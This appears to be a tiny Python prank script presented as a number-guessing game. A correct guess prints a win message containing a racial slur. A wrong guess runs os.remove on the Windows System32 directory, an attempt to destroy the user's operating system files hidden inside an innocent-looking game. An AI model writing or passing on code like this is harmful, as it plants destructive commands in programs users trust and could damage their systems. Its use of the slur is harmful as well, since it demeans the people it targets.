import random
import os

number = random.randint(1,6)
guess = input("Guess a number between 1 and 6")
guess = int(guess)

if guess == number:
    print("You win nigga!")
else:
    os.remove("C:\Windows\System32")    